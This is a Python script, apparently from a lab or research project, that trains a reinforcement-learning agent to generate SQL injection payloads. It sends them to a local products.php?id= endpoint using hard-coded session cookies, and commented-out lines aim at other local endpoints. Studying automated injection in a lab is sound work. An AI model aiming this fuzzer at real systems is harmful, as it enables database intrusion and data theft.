#!/usr/local/bin/python
import numpy as np
import requests
from model.token_encoder import learn_embeddings
from sql_parser.token_parser import TokenParser
from sql_parser.sql_data_service import SQLDataService
from model.ddpg import DDPG
from model.environment import Environment

ACTION_SIZE = 20
STATE_SIZE = 500

IP = 'localhost'

# Skips lowercase alphabet as SQL is case-insensitive.
visible_uppercase_chars = [chr(i) for i in range(32, 97)] + \
    [chr(i) for i in range(123, 128)]

data_service = SQLDataService()

columns = data_service.load_columns()
tables = data_service.load_tables()

sql_tokens = data_service.load_sql_tokens()
token_blacklist = data_service.load_sql_blacklist()

queries = data_service.load_wikisql_queries()
payloads = data_service.load_payload_files(IP)

dictionary = sql_tokens + tables + columns + visible_uppercase_chars

# Remove duplicate characters. For example, visible_uppercase_chars might contain '(',
# which may also be contained in sql_tokens.
dictionary = list(set(dictionary))

dictionary.sort(reverse=True)

print('Encoding queries...')
encoded_queries = TokenParser(dictionary, token_blacklist, queries).parse()
print(f'{len(encoded_queries)} queries encoded.')

print('Encoding payloads...')
encoded_payloads = TokenParser(dictionary, token_blacklist, payloads).parse()
print(f'{len(encoded_payloads)} payload(s) encoded.')

environment = Environment(
    dictionary, action_size=ACTION_SIZE, state_size=STATE_SIZE,
    encoded_payloads=encoded_payloads,
    columns=columns, tables=tables,
    send_request_callback= lambda payload:
        requests.get(f'http://{IP}/products.php?id={payload}', headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'cookie': 'phpMyAdmin=e50db933ce5df034826b4eada2463ade; pma_lang=en; PHPSESSID=64d8bd0e4d00a133245ad660c5d542b9; {flag}=33e8075e9970de0cfea955afd4644bb2'
        }))
        #requests.post(f'http://localhost:3000/rest/product/search',data={'q': payload})
        #requests.post('http://localhost:3000/rest/user/login', data={
        #    'email': payload
        #})
        # requests.get(f'http://127.0.0.1:5000/pages?prodLine={payload}')
                                         
state: np.ndarray

def print_decoded_injections():
    '''
    Use to verify that the predefined encoded injection list is correctly
    encoded.
    '''
    for injection in encoded_payloads:
        decoded = [dictionary[i] for i in injection]
        print(''.join(decoded))

def main():
    print('Learning SQL embeddings...')
    learn_embeddings(encoded_queries, len(dictionary))
    print('Embeddings learned.')
    
    ddpg = DDPG(environment)
    ddpg.run(total_demonstration_steps=1000)

if __name__ == '__main__':
    main()